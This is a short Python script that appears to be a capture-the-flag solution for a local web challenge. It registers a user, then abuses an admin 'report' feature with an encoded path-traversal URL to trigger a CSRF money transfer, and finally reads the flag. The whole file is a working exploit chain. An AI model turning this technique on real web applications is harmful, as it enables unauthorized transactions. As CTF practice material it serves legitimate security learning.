import requests as r
import json, random

# make a random username
USERNAME = "".join(list(map(lambda x: random.choice(list("0123456789")),range(0,25))))

URL = "http://localhost:1337"

# register a user and get the token
r1 = r.post(f"{URL}/register", headers = {
    'Content-Type':'application/json'
    }, data = json.dumps({'username':USERNAME}))

TOKEN = r1.json()['success']['token']

# Report the URL to admin and have them visit the page
# trigger CSRF to have them transfer you money
r1 = r.post(f"{URL}/report", headers = {
    'Content-Type':'application/json'
    }, data = json.dumps({'path':f'dashboard/..%2ftransfer%2f{USERNAME}%2f100000000'}))

# Refresh our user token so we have our updated balance in our user session
r1 = r.get(f"{URL}/refresh",headers={
    'Cookie': f'user={TOKEN}'
})


TOKEN = r1.json()['success']['token']

# Get the flag.
r1 = r.get(f"{URL}/flag",headers={
    'Cookie': f'user={TOKEN}'
})

idx = r1.text.find("flag:")+5
print(r1.text[idx:idx+60])